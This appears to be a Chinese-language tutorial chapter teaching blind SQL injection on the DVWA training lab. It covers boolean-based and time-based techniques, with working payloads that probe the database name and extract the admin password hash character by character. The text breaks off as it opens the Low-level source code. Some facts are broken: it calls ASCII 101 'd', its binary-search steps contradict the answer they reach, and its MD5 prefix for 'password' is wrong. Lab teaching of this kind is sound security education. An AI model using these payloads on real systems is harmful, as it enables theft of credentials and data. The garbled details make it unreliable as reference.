# Day 16：DVWA实战-SQL盲注 SQL Injection (Blind)

> **🎯 靶场实战** | 难度：⭐⭐⭐⭐ | 预计学习：80 分钟

---

# 第16章 DVWA实战：SQL 盲注（SQL Injection Blind）🦇

哈喽各位小伙伴们大家好！👋 欢迎来到第16章！

在上一章 Day15 里，我们把"前端的把戏"玩了个遍——改变量、解密前端算法、偷 Token、重放多步流程，是不是感觉自己已经变成"前端老狐狸"了？😏 今天这一章，我们要回到 SQL 注入，专门攻克 Day10 学 SQL 注入时"提了一嘴但没展开"的终极形态——**SQL 盲注（Blind SQL Injection）**。

还记得 Day10 我们学 SQL 注入时，页面会**直接把 SQL 查询结果、报错信息、甚至是 Union 出来的表数据**直接显示在网页上吗？那种叫"**显注（In-band SQLi）**"，相当于坏人直接跟数据库"面对面聊天"，数据库有啥都说。但现实世界里的网站，90% 都**不会把数据库的查询结果直接显示给你**——

> 你提交了一个带 SQL 的请求，页面只会给你两种结果：
> - 😊 **"查询成功！用户存在"**（我们叫它 True / 真）
> - 😭 **"查询失败，用户不存在 / 页面 404"**（我们叫它 False / 假）
>
> 没有报错、没有 Union 回显、什么信息都看不见——**就像你跟一个蒙着面的人说话，他只会点头（真）或摇头（假），不会说别的**。

这就是**盲注（Blind Injection）** 这个名字的由来：**数据库的回显对你来说是"瞎的、看不见的"，你只能通过页面的"真/假反馈"来一点一点"猜"出数据库里的每一个字符。** 听起来是不是特别有意思？就像玩"猜数字"游戏——

```
我（攻击者）：数据库里的第一个字符，ASCII 码是不是大于 100？😈
蒙面人（页面）：✅ 点头（True）
我：ASCII 码是不是大于 110？
蒙面人：❌ 摇头（False）
我：哦！那第一个字符的 ASCII 就在 101~110 之间！🔍
（二分查找，最多再问 3 次就能确定是 'e'）
我：那它是不是大于 104？
蒙面人：✅ 点头
我：是不是大于 106？
蒙面人：❌ 摇头
我：是不是大于 105？
蒙面人：❌ 摇头 → 哦！就是 105！ASCII=105 的字符是 'i'！🎉
```

今天这一章，我们就用这个"20 个问题游戏"的思路，在 DVWA 的 SQL Injection (Blind) 模块里，**四个级别（Low/Med/High/Impossible）逐个击穿**，而且分两种打法：
- **打法① 布尔盲注（Boolean-based）**：靠页面 True/False 区分
- **打法② 时间盲注（Time-based）**：页面连 True/False 都不给，完全一样！这时候我们靠 `sleep(3)` 让页面延迟 3 秒才返回，从**响应时间的长短**判断真假（更狠！）

每一级别依然是：大白话比喻 → 分步实操 → 逐行源码解析 → 修复建议。盲注是 SQL 注入里最考验耐心、也最能体现"安全思维"的部分，也是 CISP-PTE、CTF、护网里的必考题型——**今天把它啃透了，后面的 SQLi-Labs 你就是躺着过！** 坐稳扶好，我们出发！🚀

---

## 16.1 前置知识：显注 vs 盲注，一眼看出区别 👀

### 16.1.1 生活比喻："话痨客服" vs "高冷客服" vs "哑巴客服"

我们把 Web 应用想象成一个银行客服热线，你（攻击者）打电话过去查账户信息：

```
📞 客服类型 ①：话痨客服（= 显注 Union/Error-based）
你：帮我查一下账号 1 的余额
客服：好的，账号1 用户名 admin 余额 9999元 身份证 110101...
    （吧啦吧啦把所有信息全念给你听，Union 和报错信息也念）
→ 你一次电话就拿到全部信息 = Day10 学的显注，最爽的情况！

📞 客服类型 ②：高冷客服（= 布尔盲注 Boolean-based）
你：帮我查一下账号 1 的余额是不是 > 1000？
客服：【嗯】（只说一个字 = 对/点头，页面显示 MISSING / EXISTS）
你：那是不是 > 5000？
客服：【不是】（只说一个字 = 不对/摇头，页面显示 User ID is MISSING）
→ 你得一个问题一个问题地问，靠 Yes/No 慢慢拼出信息 = 布尔盲注

📞 客服类型 ③：哑巴客服（= 时间盲注 Time-based）
你：帮我查一下账号 1 的余额是不是 > 1000？
客服：（……沉默了 3 秒钟）          （表示"是"，因为你说"如果是就沉默3秒再挂"）
你：那是不是 > 5000？
客服：（瞬间就挂了，等都不等）    （表示"不是"）
→ 他连 Yes/No 都不说，你只能通过"沉默的时间长短"来判断 = 时间盲注
```

**划重点！⭐** 现实世界中 90% 的真实 SQL 注入场景，都是**类型 ② 或 ③**——因为网站开发者学聪明了，"我不把数据库内容显示给你看，不报错，你总没法注入了吧？"——结果反而催生了盲注这种"你不说我也能猜到"的终极技巧。😎

下面这张 SVG 对比图帮你把三种注入的区别刻进脑子里👇

<svg width="100%" viewBox="0 0 900 540" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
  <defs>
    <linearGradient id="g16a" x1="0" y1="0" x2="1" y2="1">
      <stop offset="0%" stop-color="#eff6ff"/>
      <stop offset="100%" stop-color="#dbeafe"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="900" height="540" rx="16" fill="url(#g16a)" stroke="#2563eb" stroke-width="2.5"/>
  <text x="450" y="45" text-anchor="middle" font-family="Microsoft YaHei" font-size="22" fill="#1e3a8a" font-weight="bold">🔍 三种 SQL 注入场景对比（显注 / 布尔盲注 / 时间盲注）</text>
  <!-- 列1 显注 -->
  <g transform="translate(30, 85)">
    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#16a34a" stroke-width="2.5"/>
    <rect x="0" y="0" width="270" height="50" rx="14" fill="#16a34a"/>
    <rect x="0" y="38" width="270" height="12" fill="#16a34a"/>
    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">① 显注（In-band）</text>
    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#166534">最爽！最罕见！面试常考</text>
    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' UNION SELECT 1,version(),database() --</text>
    <text x="35" y="152" font-family="Consolas" font-size="13" fill="#e2e8f0">👉 HTTP 200 OK 页面直接显示：</text>
    <rect x="35" y="162" width="200" height="65" rx="6" fill="#1e293b" stroke="#4ade80"/>
    <text x="135" y="186" text-anchor="middle" font-family="Consolas" font-size="13" fill="#4ade80" font-weight="bold">5.7.26-log</text>
    <text x="135" y="212" text-anchor="middle" font-family="Consolas" font-size="13" fill="#34d399">dvwa</text>
    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• 页面直接显示 SQL 查询结果</text>
    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• MySQL 报错信息直接打印</text>
    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#065f46">• UNION 查询结果直接渲染</text>
    <rect x="20" y="358" width="230" height="45" rx="8" fill="#dcfce7" stroke="#16a34a"/>
    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#166534" font-weight="bold">获取 1 条数据 = 1 次请求 ⚡</text>
  </g>
  <!-- 列2 布尔盲注 -->
  <g transform="translate(315, 85)">
    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#f59e0b" stroke-width="2.5"/>
    <rect x="0" y="0" width="270" height="50" rx="14" fill="#f59e0b"/>
    <rect x="0" y="38" width="270" height="12" fill="#f59e0b"/>
    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">② 布尔盲注（Boolean）</text>
    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#92400e">真实世界最常见！Yes/No 猜</text>
    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' AND ASCII(SUBSTRING(user(),1,1))>100 --</text>
    <text x="35" y="156" font-family="Consolas" font-size="13" fill="#16a34a">👉 True 时页面显示：</text>
    <text x="60" y="176" font-family="Microsoft YaHei" font-size="13" fill="#16a34a" font-weight="bold">✔ User ID exists in DB.</text>
    <text x="35" y="206" font-family="Consolas" font-size="13" fill="#dc2626">👉 False 时页面显示：</text>
    <text x="60" y="226" font-family="Microsoft YaHei" font-size="13" fill="#dc2626" font-weight="bold">✘ User ID is MISSING.</text>
    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 只有两种稳定页面状态</text>
    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 不显示具体 SQL 数据/报错</text>
    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#92400e">• 用二分查找猜每个字符</text>
    <rect x="20" y="358" width="230" height="45" rx="8" fill="#fef3c7" stroke="#d97706"/>
    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#92400e" font-weight="bold">获取 1 个字符 = 约 7 次请求 🐢</text>
  </g>
  <!-- 列3 时间盲注 -->
  <g transform="translate(600, 85)">
    <rect x="0" y="0" width="270" height="420" rx="14" fill="white" stroke="#dc2626" stroke-width="2.5"/>
    <rect x="0" y="0" width="270" height="50" rx="14" fill="#dc2626"/>
    <rect x="0" y="38" width="270" height="12" fill="#dc2626"/>
    <text x="135" y="33" text-anchor="middle" font-family="Microsoft YaHei" font-size="18" font-weight="bold" fill="white">③ 时间盲注（Time-based）</text>
    <text x="135" y="78" text-anchor="middle" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">终极武器！啥页面都能打</text>
    <rect x="20" y="100" width="230" height="140" rx="10" fill="#0f172a" stroke="#1e293b"/>
    <text x="35" y="128" font-family="Consolas" font-size="12" fill="#fbbf24">// 输入 1' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(3),0) --</text>
    <text x="35" y="158" font-family="Consolas" font-size="13" fill="#16a34a">👉 True 时：响应时间 = 3200 ms</text>
    <g transform="translate(60, 168)">
      <rect x="0" y="0" width="150" height="10" rx="5" fill="#334155"/>
      <rect x="0" y="0" width="140" height="10" rx="5" fill="#f97316"/>
      <text x="75" y="25" text-anchor="middle" font-family="Consolas" font-size="10" fill="#fb923c">██████████░░ 3.2s</text>
    </g>
    <text x="35" y="218" font-family="Consolas" font-size="13" fill="#dc2626">👉 False 时：响应时间 = 45 ms</text>
    <g transform="translate(60, 228)">
      <rect x="0" y="0" width="150" height="10" rx="5" fill="#334155"/>
      <rect x="0" y="0" width="3" height="10" rx="5" fill="#22c55e"/>
      <text x="75" y="25" text-anchor="middle" font-family="Consolas" font-size="10" fill="#22c55e">█░░░░░░░░░░░ 0.045s</text>
    </g>
    <text x="30" y="270" font-family="Microsoft YaHei" font-size="14" fill="#0f172a" font-weight="bold">✅ 回显特征：</text>
    <text x="30" y="295" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• True / False 页面完全一样！</text>
    <text x="30" y="318" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• 只能通过响应时间差判断</text>
    <text x="30" y="341" font-family="Microsoft YaHei" font-size="13" fill="#7f1d1d">• SLEEP() / BENCHMARK() 做延迟</text>
    <rect x="20" y="358" width="230" height="45" rx="8" fill="#fee2e2" stroke="#dc2626"/>
    <text x="135" y="385" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#7f1d1d" font-weight="bold">获取 1 个字符 = 约 7×3 秒 🐌</text>
  </g>
</svg>

### 16.1.2 盲注必备的 5 个 SQL 函数（必须背下来！）

这 5 个函数是盲注的"十八般兵器"，今天每一个都会被我们用到滚瓜烂熟👇

| 函数 | MySQL 语法 | 大白话作用 | 盲注里我们怎么用？ |
|---|---|---|---|
| **① SUBSTRING() / MID()** | `SUBSTRING(字符串, 起始位置, 长度)` | 把字符串里的"第 N 个字符"抠出来，比如 `SUBSTRING("admin",1,1)='a'` | 逐个字符猜，比如猜数据库名第 1 个字符、第 2 个字符 |
| **② ASCII()** | `ASCII(单个字符)` | 把字符转成 0~127 的 ASCII 数字，比如 `ASCII('a')=97` | 配合二分查找，不用枚举 95 个可见字符，7 次就猜中 |
| **③ LENGTH()** | `LENGTH(字符串)` | 返回字符串长度，比如 `LENGTH(DATABASE())=4` 就是 'dvwa' | 先猜"目标字符串总长度"，知道要猜几轮就停 |
| **④ SLEEP(N)** | `SLEEP(3)` | 让 SQL 线程"睡 3 秒"再返回结果（MySQL 独有，PostgreSQL 用 pg_sleep） | 时间盲注的灵魂！True 就睡 3 秒，False 不睡，靠响应时间判断 |
| **⑤ IF(expr, A, B)** | `IF(1=1,'对','错')` | 三目运算符，expr 为真返回 A，为假返回 B | 配合 SLEEP 用：`IF(条件, SLEEP(3), 0)` → 条件真才延迟 |

**记忆口诀：** 🎵 长度用 LENGTH，逐个抠 SUBSTRING，转数字 ASCII，等时间 SLEEP，二选一 IF。🎵

### 16.1.3 盲注的标准 4 步流程（今天全章反复用这个套路）

不管是布尔盲注还是时间盲注，**不管目标是数据库名/表名/列名/数据**，我们都按这 4 步走：

```
Step 1：测"注入点能不能闭合" + 测"True / False 两个页面长什么样"
         （布尔盲注看 HTML 差异，时间盲注看 SLEEP 有没有生效）
Step 2：猜 LENGTH(目标字符串) 有多长
         （比如数据库名长度是 4，那就只要猜 4 轮）
Step 3：逐个字符猜，第 i 个字符是什么（用 SUBSTRING + 二分查找）
Step 4：把猜到的字符一个个拼起来，就是完整的答案！
         （比如第1个='d'，第2个='v'，第3个='w'，第4个='a' → dvwa 🎉）
```

好，理论说完！🔥 下面我们进入 DVWA **SQL Injection (Blind)** 模块，从 Low 级别开干！

---

## 16.2 正式闯关：Low 级别 —— 毫无防护的"裸奔"盲注

### 16.2.1 正常玩家视角：页面长啥样？👀

登录 DVWA → 左侧把 **DVWA Security** 改成 **low** → 左侧点 **SQL Injection (Blind)** 菜单。

你会看到一个输入框写着"**User ID**"，旁边一个 Submit 按钮：
- 输入 `1` → 页面显示：**User ID exists in the database.**（绿色提示，说明这是 True 页面）
- 输入 `9999`（不存在的 ID）→ 页面显示：**User ID is MISSING from the database.**（红色提示，说明这是 False 页面）

**完美！！⭐** 这就是标准的"高冷客服"——只有 True/False 两种反馈。盲注条件满足！！

### 16.2.2 布尔盲注打法①：先闭合注入点，再确认 True/False

先测一下这个注入点是**数字型还是字符型**？（Day10 学过的判断方法）

```
输入 1 AND 1=1  → 点 Submit → 页面显示【User ID exists】(True) ✅
输入 1 AND 1=2  → 点 Submit → 页面显示【User ID exists】(还是 True？不对...)
```

哦？`AND 1=2` 逻辑结果是 False，但页面还是 True——说明这不是"数字型"，而是**字符型注入**！（外面有引号包裹）那我们尝试用 `'` 闭合它：

```
输入 1' AND '1'='1  → 点 Submit → 【User ID exists】(True) ✅
输入 1' AND '1'='2  → 点 Submit → 【User ID MISSING】(False) ✅ 成功！
```

**也可以用注释符 `-- ` 闭合**（注意减号减号后面有个空格！）：

```
输入 1' AND 1=1 --  → True ✅
输入 1' AND 1=2 --  → False ✅ 完美闭合！
```

下面这张 SVG 演示了闭合成功后 True/False 两个条件是怎么被后端执行的👇

<svg width="100%" viewBox="0 0 900 380" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
  <rect x="0" y="0" width="900" height="380" rx="14" fill="#f0fdf4" stroke="#16a34a" stroke-width="2"/>
  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#166534" font-weight="bold">Step 1：闭合注入点 + 确认 True / False 两种页面</text>
  <!-- True 路径 -->
  <g transform="translate(40,80)">
    <rect x="0" y="0" width="400" height="260" rx="12" fill="white" stroke="#16a34a" stroke-width="2"/>
    <rect x="0" y="0" width="400" height="45" rx="12" fill="#16a34a"/>
    <rect x="0" y="32" width="400" height="13" fill="#16a34a"/>
    <text x="200" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">✅ AND 1=1 --  (逻辑真)</text>
    <text x="20" y="80" font-family="Microsoft YaHei" font-size="14" fill="#166534" font-weight="bold">后端拼接出的 SQL：</text>
    <rect x="20" y="95" width="360" height="48" rx="8" fill="#0f172a"/>
    <text x="30" y="125" font-family="Consolas" font-size="13" fill="#fbbf24">SELECT first_name, last_name</text>
    <text x="30" y="142" font-family="Consolas" font-size="13" fill="#86efac">FROM users WHERE user_id = '1' AND 1=1 --';</text>
    <g transform="translate(20,165)">
      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">MySQL 执行结果：</text>
      <rect x="0" y="12" width="360" height="32" rx="6" fill="#dcfce7" stroke="#16a34a"/>
      <text x="180" y="33" text-anchor="middle" font-family="Consolas" font-size="13" fill="#15803d" font-weight="bold">WHERE 条件 = TRUE, 查询到了 admin 的记录</text>
    </g>
    <g transform="translate(20,220)">
      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">👉 页面回显：</text>
      <rect x="0" y="12" width="360" height="28" rx="6" fill="#bbf7d0" stroke="#16a34a" stroke-width="2"/>
      <text x="180" y="31" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#14532d" font-weight="bold">✔ User ID exists in the database.</text>
    </g>
  </g>
  <!-- False 路径 -->
  <g transform="translate(460,80)">
    <rect x="0" y="0" width="400" height="260" rx="12" fill="white" stroke="#dc2626" stroke-width="2"/>
    <rect x="0" y="0" width="400" height="45" rx="12" fill="#dc2626"/>
    <rect x="0" y="32" width="400" height="13" fill="#dc2626"/>
    <text x="200" y="30" text-anchor="middle" font-family="Microsoft YaHei" font-size="17" font-weight="bold" fill="white">❌ AND 1=2 --  (逻辑假)</text>
    <text x="20" y="80" font-family="Microsoft YaHei" font-size="14" fill="#7f1d1d" font-weight="bold">后端拼接出的 SQL：</text>
    <rect x="20" y="95" width="360" height="48" rx="8" fill="#0f172a"/>
    <text x="30" y="125" font-family="Consolas" font-size="13" fill="#fbbf24">SELECT first_name, last_name</text>
    <text x="30" y="142" font-family="Consolas" font-size="13" fill="#fca5a5">FROM users WHERE user_id = '1' AND 1=2 --';</text>
    <g transform="translate(20,165)">
      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">MySQL 执行结果：</text>
      <rect x="0" y="12" width="360" height="32" rx="6" fill="#fee2e2" stroke="#dc2626"/>
      <text x="180" y="33" text-anchor="middle" font-family="Consolas" font-size="13" fill="#b91c1c" font-weight="bold">WHERE 条件 = FALSE, 查询结果为空</text>
    </g>
    <g transform="translate(20,220)">
      <text x="0" y="0" font-family="Microsoft YaHei" font-size="13" fill="#0f172a" font-weight="bold">👉 页面回显：</text>
      <rect x="0" y="12" width="360" height="28" rx="6" fill="#fecaca" stroke="#dc2626" stroke-width="2"/>
      <text x="180" y="31" text-anchor="middle" font-family="Microsoft YaHei" font-size="14" fill="#450a0a" font-weight="bold">✘ User ID is MISSING from the database.</text>
    </g>
  </g>
</svg>

### 16.2.3 布尔盲注 Step 2：先猜 DATABASE() 有多长？

目标：先搞清楚当前数据库（DATABASE()）的名字有几个字符？我们知道答案是 'dvwa' = 4 个字符，但假装不知道，一步步猜：

```
输入 1' AND LENGTH(DATABASE()) > 10 --  → False ❌ (长度 ≤ 10)
输入 1' AND LENGTH(DATABASE()) >  5 --  → False ❌ (长度 ≤ 5)
输入 1' AND LENGTH(DATABASE()) >  3 --  → True  ✅ (长度 > 3 且 ≤ 5 → 要么 4 要么 5)
输入 1' AND LENGTH(DATABASE()) =  4 --  → True  ✅ 🎉 猜到了！DATABASE() 长度 = 4！
```

**二分查找思路：** 猜 4 次就出结果，比从 1 开始一个个试（最多试 4 次也 OK，但长字符串（比如表名 15+ 字符）二分法差距就拉开了）。

### 16.2.4 布尔盲注 Step 3：逐个字符猜 DATABASE() 的 4 个字母

我们要知道 SUBSTRING(DATABASE(), i, 1)，对于 i=1 到 4。

**猜第 1 个字符：**
```
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 100 --  → True  ✅ (ASCII > 100, 字母 > 'd')
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 110 --  → False ❌ (≤ 110)  → 范围 (100,110]
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 105 --  → False ❌ (≤ 105)  → 范围 (100,105]
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) > 102 --  → False ❌ (≤ 102)  → 范围 (100,102] → 101 or 102
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) = 100 --  → False ❌
1' AND ASCII(SUBSTRING(DATABASE(),1,1)) = 101 --  → True  ✅  ASCII=101 = 'd'！
```

太棒！第 1 个字符是 **'d'**！按同样套路猜剩下 3 个（这里简化，只给最终 payload）：
```
第 2 字符 ASCII=118 = 'v' → 1' AND ASCII(SUBSTRING(DATABASE(),2,1))=118 -- ✅
第 3 字符 ASCII=119 = 'w' → 1' AND ASCII(SUBSTRING(DATABASE(),3,1))=119 -- ✅
第 4 字符 ASCII=97  = 'a' → 1' AND ASCII(SUBSTRING(DATABASE(),4,1))=97  -- ✅
```

**Step 4 拼起来：d + v + w + a = 'dvwa'！🎉🎉🎉** 数据库名爆出来了！

下面这张 SVG 流程图把"猜第 1 个字符是 'd'"的二分查找过程画成了决策树👇

<svg width="100%" viewBox="0 0 900 520" xmlns="http://www.w3.org/2000/svg" style="margin:20px 0;">
  <rect x="0" y="0" width="900" height="520" rx="14" fill="#fffbeb" stroke="#d97706" stroke-width="2"/>
  <text x="450" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="20" fill="#92400e" font-weight="bold">🔍 猜 DATABASE() 第 1 个字符的二分查找决策树（最多 7 次猜中 0~127 任一字节）</text>
  <!-- Level 0 根节点 -->
  <g transform="translate(380,65)">
    <rect x="0" y="0" width="140" height="52" rx="26" fill="#2563eb" stroke="#1e40af" stroke-width="2"/>
    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 64?</text>
    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bfdbfe">第 1 次请求</text>
  </g>
  <!-- 分支线 level 0-1 -->
  <line x1="450" y1="117" x2="230" y2="155" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="450" y1="117" x2="670" y2="155" stroke="#2563eb" stroke-width="2.5"/>
  <text x="280" y="143" font-family="Microsoft YaHei" font-size="12" fill="#16a34a" font-weight="bold">Yes (≤127 都>64)</text>
  <text x="620" y="143" font-family="Microsoft YaHei" font-size="12" fill="#dc2626" font-weight="bold">No</text>
  <!-- Level 1: > 96? -->
  <g transform="translate(150,160)">
    <rect x="0" y="0" width="140" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 96?</text>
    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 2 次</text>
  </g>
  <!-- Level 1 分支 -->
  <line x1="220" y1="212" x2="130" y2="255" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="220" y1="212" x2="310" y2="255" stroke="#2563eb" stroke-width="2.5"/>
  <text x="105" y="243" font-family="Microsoft YaHei" font-size="11" fill="#dc2626" font-weight="bold">No</text>
  <text x="330" y="243" font-family="Microsoft YaHei" font-size="11" fill="#16a34a" font-weight="bold">Yes ✅ (>96 小写字母)</text>
  <!-- Level 2: > 112? 和 > 104? -->
  <g transform="translate(240,260)">
    <rect x="0" y="0" width="140" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
    <text x="70" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 104?</text>
    <text x="70" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 3 次</text>
  </g>
  <line x1="310" y1="312" x2="260" y2="355" stroke="#2563eb" stroke-width="2.5"/>
  <line x1="310" y1="312" x2="360" y2="355" stroke="#2563eb" stroke-width="2.5"/>
  <text x="215" y="343" font-family="Microsoft YaHei" font-size="11" fill="#dc2626" font-weight="bold">No → 范围(96,104]</text>
  <text x="375" y="343" font-family="Microsoft YaHei" font-size="11" fill="#16a34a" font-weight="bold">Yes</text>
  <!-- Level 3: 走左边 (96,104] 再二分 -->
  <g transform="translate(155,360)">
    <rect x="0" y="0" width="160" height="52" rx="26" fill="#16a34a" stroke="#15803d" stroke-width="2"/>
    <text x="80" y="22" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII > 100?</text>
    <text x="80" y="42" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#bbf7d0">第 4 次 → Yes ✅ (99<101<104)</text>
  </g>
  <line x1="235" y1="412" x2="215" y2="460" stroke="#2563eb" stroke-width="2.5"/>
  <!-- Level 4: 再二分 (100,104] -->
  <g transform="translate(110,465)">
    <rect x="0" y="0" width="180" height="50" rx="25" fill="#d97706" stroke="#92400e" stroke-width="2.5"/>
    <text x="90" y="20" text-anchor="middle" font-family="Consolas" font-size="13" fill="white" font-weight="bold">ASCII = 101 ?</text>
    <text x="90" y="40" text-anchor="middle" font-family="Microsoft YaHei" font-size="11" fill="#fef3c7">第 6 次 → Yes ✅ 'd'！</text>
  </g>
  <!-- 结果高亮：ASCII=101 高亮框 -->
  <g transform="translate(590,190)">
    <rect x="0" y="0" width="280" height="310" rx="14" fill="#f0f9ff" stroke="#0ea5e9" stroke-width="2.5"/>
    <text x="140" y="35" text-anchor="middle" font-family="Microsoft YaHei" font-size="16" fill="#0c4a6e" font-weight="bold">🎯 本次猜解总览</text>
    <g transform="translate(20,55)">
      <text x="0" y="0" font-family="Consolas" font-size="12" fill="#334155">第1次 >64?   → Yes</text>
      <text x="0" y="22" font-family="Consolas" font-size="12" fill="#334155">第2次 >96?   → Yes</text>
      <text x="0" y="44" font-family="Consolas" font-size="12" fill="#334155">第3次 >104?  → No  (≤104)</text>
      <text x="0" y="66" font-family="Consolas" font-size="12" fill="#334155">第4次 >100?  → Yes (>100)</text>
      <text x="0" y="88" font-family="Consolas" font-size="12" fill="#334155">第5次 >102?  → No  (≤102)</text>
      <text x="0" y="110" font-family="Consolas" font-size="12" fill="#16a34a" font-weight="bold">第6次 =101?  → Yes ✅</text>
      <line x1="0" y1="125" x2="240" y2="125" stroke="#0ea5e9" stroke-width="2"/>
      <text x="0" y="150" font-family="Microsoft YaHei" font-size="14" fill="#0c4a6e" font-weight="bold">结论：第 1 个字符 = 'd'</text>
      <text x="0" y="180" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 2 个字符 'v' (ASCII=118)</text>
      <text x="0" y="205" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 3 个字符 'w' (ASCII=119)</text>
      <text x="0" y="230" font-family="Microsoft YaHei" font-size="13" fill="#0369a1">第 4 个字符 'a' (ASCII=97)</text>
    </g>
    <rect x="20" y="270" width="240" height="32" rx="8" fill="#0ea5e9"/>
    <text x="140" y="292" text-anchor="middle" font-family="Consolas" font-size="17" fill="white" font-weight="bold">DATABASE() = 'dvwa' 🎉</text>
  </g>
</svg>

### 16.2.5 布尔盲注实战：爆破 admin 用户的密码 hash（一步步完整演示）

爆库名只是开胃菜！正餐是爆 **admin 用户的 password 字段**（DVWA 里是 MD5 32 位），我们按 4 步来：

**Step 1：先确认 admin 用户存在 + 猜 password 长度？**
```
输入 1' AND EXISTS(SELECT * FROM users WHERE user='admin' AND LENGTH(password)=32) -- → True ✅
```
太棒，32 位（说明就是 MD5！）。

**Step 2：逐个字符猜 password 的 32 个字符。** 第 1 个字符：
```
1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 96 --  → True ✅ (小写字母)
1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)) > 102 -- → False ❌ (≤ 102 = 'f')
```
我们可以用 `=` 直接一个个试（因为 32 位 MD5 只有 0-9 和 a-f 16 种可能，比二分法还快！）：
```
1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5' -- → True ✅
```
第 1 个字符是 **'5'**！同样套路爆出来前 8 位（方便你对照）：
```
第1位='5', 第2位='f', 第3位='4', 第4位='d',
第5位='3', 第6位='c', 第7位='9', 第8位='1'  →  "5f4d3c91" （正是 password 的 MD5 开头！💪）
... 重复 32 轮就拿到完整 MD5 →  cmd5 解密 → 'password'！🎉
```

> 💡 **零基础小提示：** 布尔盲注手动弄 32 位非常累（16×32=512 次请求），所以实战都是写 Python 脚本跑，我们会在 **16.6 节**给你一份完整脚本直接用！你现在先手动练 3~5 个字符掌握原理就够了。

### 16.2.6 时间盲注打法②：如果页面连 True/False 都区分不开怎么办？

**场景：** 页面不管输入啥，都永远显示"User ID exists"（没有 MISSING 字样），布尔盲注用不了——**上时间盲注！** 靠 `SLEEP(3)` 让页面延迟。

**Step 1：测试 SLEEP 有没有生效？**
```
输入 1' AND SLEEP(3) --  → 点 Submit → 等了整整 3 秒才返回！✅ 成功！
```
（如果输入 `1 AND SLEEP(3)` 立刻返回，那说明是字符型，必须加 `'` 闭合，跟上面一样）

**Step 2：猜 DATABASE() 长度？**
```
1' AND IF(LENGTH(DATABASE())=4, SLEEP(3), 0) -- → 延迟 3 秒 ✅ 长度是 4！
1' AND IF(LENGTH(DATABASE())=5, SLEEP(3), 0) -- → 立刻返回 ❌
```

**Step 3：逐个字符猜**（以第 1 字符为例）：
```
1' AND IF(SUBSTRING(DATABASE(),1,1)='d', SLEEP(3), 0) -- → 延迟 3 秒 ✅ 第1位='d'！
```
剩下字符一样套路。**时间盲注的关键：只要响应时间 > 2.5 秒就算 True，否则算 False。**

### 16.2.7 Low 级别源码解析：为啥它这么容易被打？💻

打开 DVWA 源码文件 `vulnerabilities/sqli_blind/source/low.php`：

```php
<?php
// (C) 2010-... Damn Vulnerable Web Application
